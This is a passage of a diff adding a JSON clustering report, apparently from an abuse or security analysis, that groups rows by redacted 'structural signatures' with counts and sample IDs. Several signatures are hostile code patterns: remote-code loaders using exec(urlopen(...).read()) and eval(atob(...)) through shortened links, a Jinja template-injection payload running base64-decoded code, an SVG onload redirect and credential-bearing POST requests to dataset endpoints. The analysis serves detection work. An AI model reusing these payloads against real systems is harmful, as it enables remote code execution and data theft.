+        "R0151223",
+        "R0151273",
+        "R0151335"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 25 URL 113]",
+          8
+        ],
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[REDACTED:destination:024767]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024791]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024794]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024806]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024851]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024906]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG082",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';exec(u.urlopen('[shortener url <N>]').read())",
+      "sample_count": 194,
+      "coverage_ratio": 0.001036,
+      "representative_ids": [
+        "R0056140",
+        "R0057333",
+        "R0067678",
+        "R0073331",
+        "R0073332",
+        "R0073334",
+        "R0073335",
+        "R0073336"
+      ],
+      "top_marker_strings": [
+        [
+          "[SHORTENER URL 23190]",
+          3
+        ],
+        [
+          "[REDACTED:opaque_fragment:000276]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_fragment:000316]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000197]",
+          1
+        ],
+        [
+          "[SHORTENER URL 54712]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000198]",
+          1
+        ],
+        [
+          "[SHORTENER URL 54713]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000404]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG083",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "t='[credential <N>]';x=new xmlhttprequest;x.open('post','https://huggingface.co/api/datasets/[redacted:destination:<N>]',false);x.setrequestheader('authorization','bearer '+t);x.setrequestheader('content-type','application/x-ndjson');x.send(\"{\\\"key\\\":\\\"header\\",
+      "sample_count": 193,
+      "coverage_ratio": 0.001031,
+      "representative_ids": [
+        "R0018652",
+        "R0027655",
+        "R0029671",
+        "R0030703",
+        "R0031098",
+        "R0060127",
+        "R0060402",
+        "R0061042"
+      ],
+      "top_marker_strings": [
+        [
+          "['name']",
+          39
+        ],
+        [
+          "[0]",
+          29
+        ],
+        [
+          "[1]",
+          12
+        ],
+        [
+          "[ENCODED BLOB]",
+          11
+        ],
+        [
+          "['volumes']",
+          11
+        ],
+        [
+          "[CREDENTIAL 170]",
+          9
+        ],
+        [
+          "[REDACTED:destination:004588]",
+          6
+        ],
+        [
+          "[REDACTED:destination:003272]",
+          6
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG084",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "n('[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shor",
+      "sample_count": 192,
+      "coverage_ratio": 0.001025,
+      "representative_ids": [
+        "R0004715",
+        "R0004757",
+        "R0004760",
+        "R0004762",
+        "R0006109",
+        "R0006301",
+        "R0006355",
+        "R0006384"
+      ],
+      "top_marker_strings": [
+        [
+          "[SHORTENER CODE 5552]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5553]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5554]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5555]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5556]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5557]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5558]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 5559]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG085",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>] x='[encoded blob <N>]'",
+      "sample_count": 189,
+      "coverage_ratio": 0.001009,
+      "representative_ids": [
+        "R0147417",
+        "R0147418",
+        "R0147419",
+        "R0147420",
+        "R0147421",
+        "R0147422",
+        "R0147423",
+        "R0147424"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 109145]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109146]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109147]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109148]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109149]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109150]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 109151]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG086",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "fetch(\"https://[redacted:destination:<N>][service <N> url <N>]\",{method:'post',headers:{'content-type':'application/json','x-api-key':\"[credential <N>]\"},body:\"{\\\"agent_id\\\":\\\"[redacted:runtime_identifier]\\\"}\"}).then(r=>r.text().then(t=>[r.status,t])).then(a=>",
+      "sample_count": 188,
+      "coverage_ratio": 0.001004,
+      "representative_ids": [
+        "R0000030",
+        "R0000247",
+        "R0000272",
+        "R0000285",
+        "R0000526",
+        "R0000531",
+        "R0000535",
+        "R0000631"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000002]",
+          8
+        ],
+        [
+          "[CREDENTIAL 1]",
+          8
+        ],
+        [
+          "[REDACTED:runtime_identifier]",
+          8
+        ],
+        [
+          "[r.status,t]",
+          8
+        ],
+        [
+          "[0]",
+          8
+        ],
+        [
+          "[1]",
+          8
+        ],
+        [
+          "[SERVICE 2 URL 3]",
+          7
+        ],
+        [
+          "[PROXY 4 URL 1]",
+          7
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG087",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>] x+='[redacted:opaque_fragment:<N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 187,
+      "coverage_ratio": 0.000999,
+      "representative_ids": [
+        "R0119076",
+        "R0120130",
+        "R0120413",
+        "R0120744",
+        "R0121866",
+        "R0121939",
+        "R0122205",
+        "R0126564"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 325]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 73217]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003343]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003344]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74304]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003574]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003575]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74591]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG088",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "s+='[encoded blob <N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 185,
+      "coverage_ratio": 0.000988,
+      "representative_ids": [
+        "R0160209",
+        "R0160244",
+        "R0160264",
+        "R0160292",
+        "R0160685",
+        "R0160762",
+        "R0160767",
+        "R0160848"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 97030]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:012118]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 90491]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:009366]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 81702]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:005149]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 89476]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:008987]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG089",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "(async()=>{let s=u=>'[service <N> url <N>]'+encodeuricomponent(u),say=s=>document.body.innerhtml='<pre style=\"font-size:<N>px\">'+s+'</pre>',r,t;try{say('start');let hold=new image;hold.src='[service <N> url <N>]';document.body.append(hold);let zz=uint<N>array.",
+      "sample_count": 182,
+      "coverage_ratio": 0.000972,
+      "representative_ids": [
+        "R0053782",
+        "R0053783",
+        "R0053784",
+        "R0053785",
+        "R0053787",
+        "R0053789",
+        "R0053791",
+        "R0053793"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 9 URL 2]",
+          8
+        ],
+        [
+          "[SERVICE 3 URL 69]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 528]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 530]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 532]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 534]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 538]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 540]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG090",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "a[<N>]='';d() [encoded blob <N>]",
+      "sample_count": 181,
+      "coverage_ratio": 0.000967,
+      "representative_ids": [
+        "R0004679",
+        "R0004680",
+        "R0004681",
+        "R0004682",
+        "R0004685",
+        "R0004686",
+        "R0004687",
+        "R0004688"
+      ],
+      "top_marker_strings": [
+        [
+          "[12]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1161]",
+          1
+        ],
+        [
+          "[15]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1162]",
+          1
+        ],
+        [
+          "[16]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1163]",
+          1
+        ],
+        [
+          "[19]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1164]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG091",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "d=[];n=<N>;s='[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code <N>],[shortener code",
+      "sample_count": 181,
+      "coverage_ratio": 0.000967,
+      "representative_ids": [
+        "R0002071",
+        "R0002262",
+        "R0005272",
+        "R0005277",
+        "R0005281",
+        "R0005287",
+        "R0005310",
+        "R0005321"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER-1-HOST]",
+          8
+        ],
+        [
+          "[i]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 7479]",
+          5
+        ],
+        [
+          "[SHORTENER CODE 7533]",
+          2
+        ],
+        [
+          "[SHORTENER CODE 7534]",
+          2
+        ],
+        [
+          "[SHORTENER CODE 7535]",
+          2
+        ],
+        [
+          "[SHORTENER CODE 7536]",
+          2
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG092",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>] x+='';n('[redacted:opaque_fragment:<N>]') [redacted:opaque_base<N>:<N>]",
+      "sample_count": 178,
+      "coverage_ratio": 0.000951,
+      "representative_ids": [
+        "R0120345",
+        "R0122237",
+        "R0122785",
+        "R0123113",
+        "R0123330",
+        "R0124497",
+        "R0124559",
+        "R0124854"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 325]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 74517]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003627]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:003481]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76462]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:004024]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:003617]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 77053]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG093",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "{{ cycler.__init__.__globals__.__builtins__.exec(cycler.__init__.__globals__.__builtins__.__import__('base<N>').b<N>decode('[redacted:opaque_encoded_blob:<N>]')) }}",
+      "sample_count": 177,
+      "coverage_ratio": 0.000945,
+      "representative_ids": [
+        "R0069093",
+        "R0069099",
+        "R0069163",
+        "R0069166",
+        "R0069247",
+        "R0069320",
+        "R0069326",
+        "R0069362"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_encoded_blob:000158]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000159]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000161]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000162]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000165]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000167]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000168]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_encoded_blob:000170]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG094",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>]=[redacted:destination:<N>]",
+      "sample_count": 175,
+      "coverage_ratio": 0.000935,
+      "representative_ids": [
+        "R0079764",
+        "R0079767",
+        "R0079903",
+        "R0079926",
+        "R0080070",
+        "R0080275",
+        "R0080410",
+        "R0080535"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 121 URL 2]",
+          7
+        ],
+        [
+          "[REDACTED:destination:009640]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009641]",
+          1
+        ],
+        [
+          "[SERVICE 121 URL 9]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009679]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009683]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009723]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009775]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG095",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>] ;z(<N>,'[redacted:opaque_fragment:<N>]')",
+      "sample_count": 171,
+      "coverage_ratio": 0.000913,
+      "representative_ids": [
+        "R0146735",
+        "R0146736",
+        "R0146737",
+        "R0146749",
+        "R0146750",
+        "R0146751",
+        "R0146752",
+        "R0146753"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 107656]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:018556]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 107657]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:018557]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 107658]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:018558]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 107670]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG096",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "a=[];c=<N>;d=()=>{if(!--c)eval(atob(a.join('')))};n=x=>{for(s of x.split(',')){e=document.createelement('script');e.src='[redacted:destination:<N>][shortener-<N>-host]'+s;document.head.append(e)}};n('[shortener code <N>],[shortener code <N>],[shortener code <N",
+      "sample_count": 169,
+      "coverage_ratio": 0.000903,
+      "representative_ids": [
+        "R0012285",
+        "R0012595",
+        "R0012713",
+        "R0012765",
+        "R0012880",
+        "R0013472",
+        "R0013519",
+        "R0013713"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER-1-HOST]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 18954]",
+          4
+        ],
+        [
+          "[SHORTENER CODE 18952]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 18953]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 18955]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 18956]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 18957]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG097",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[redacted:destination:<N>][shortener url <N>]><\\/script>')",
+      "sample_count": 169,
+      "coverage_ratio": 0.000903,
+      "representative_ids": [
+        "R0004080",
+        "R0024278",
+        "R0024280",
+        "R0024281",
+        "R0024282",
+        "R0057487",
+        "R0057488",
+        "R0063836"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_fragment:000027]",
+          2
+        ],
+        [
+          "[SHORTENER URL 4576]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_fragment:000172]",
+          2
+        ],
+        [
+          "[SHORTENER URL 35032]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_fragment:000173]",
+          2
+        ],
+        [
+          "[SHORTENER URL 35033]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_fragment:000170]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG098",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "<html><style>body{margin:<N>} div{display:inline-block;width:<N>px;height:<N>px;overflow:hidden;font:<N>px monospace} [encoded blob] q=new xmlhttprequest();q.open('get','https://[redacted:destination:<N>]',false);q.send(null);var x=json.parse(q.responsetext);d",
+      "sample_count": 168,
+      "coverage_ratio": 0.000897,
+      "representative_ids": [
+        "R0150844",
+        "R0150849",
+        "R0151381",
+        "R0151407",
+        "R0151409",
+        "R0151462",
+        "R0151617",
+        "R0151678"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB]",
+          16
+        ],
+        [
+          "[REDACTED:destination:024777]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024778]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024947]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024956]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024957]",
+          1
+        ],
+        [
+          "[REDACTED:destination:024976]",
+          1
+        ],
+        [
+          "[REDACTED:destination:025059]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG099",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>][shortener url <N>]",
+      "sample_count": 168,
+      "coverage_ratio": 0.000897,
+      "representative_ids": [
+        "R0078753",
+        "R0079762",
+        "R0079810",
+        "R0079883",
+        "R0079907",
+        "R0080026",
+        "R0080174",
+        "R0080556"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 11 URL 1]",
+          2
+        ],
+        [
+          "[SERVICE 11 URL 6]",
+          2
+        ],
+        [
+          "[SHORTENER URL 87796]",
+          1
+        ],
+        [
+          "[SERVICE 6 URL 2]",
+          1
+        ],
+        [
+          "[SHORTENER URL 88207]",
+          1
+        ],
+        [
+          "[SERVICE 14 URL 5]",
+          1
+        ],
+        [
+          "[SHORTENER URL 88233]",
+          1
+        ],
+        [
+          "[SHORTENER URL 88286]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG100",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "https://[redacted:destination:<N>] <svg onload=\"name+='[encoded blob]';location='//[shortener url <N>]'\">",
+      "sample_count": 167,
+      "coverage_ratio": 0.000892,
+      "representative_ids": [
+        "R0125257",
+        "R0125263",
+        "R0125264",
+        "R0125270",
+        "R0125271",
+        "R0125286",
+        "R0125290",
+        "R0125334"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB]",
+          8
+        ],
+        [
+          "[REDACTED:destination:028258]",
+          1
+        ],
+        [
+          "[SHORTENER URL 151793]",
+          1
+        ],
+        [
+          "[REDACTED:destination:028263]",
+          1
+        ],
+        [
+          "[SHORTENER URL 151796]",
+          1
+        ],
+        [
+          "[REDACTED:destination:028264]",
+          1
+        ],
+        [
+          "[SHORTENER URL 151797]",
+          1
+        ],
+        [
+          "[REDACTED:destination:028268]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    }
+  ],
+  "caveat": "Structural buckets are evidence seeds and deterministic pattern labels, not proof of one campaign."
+}
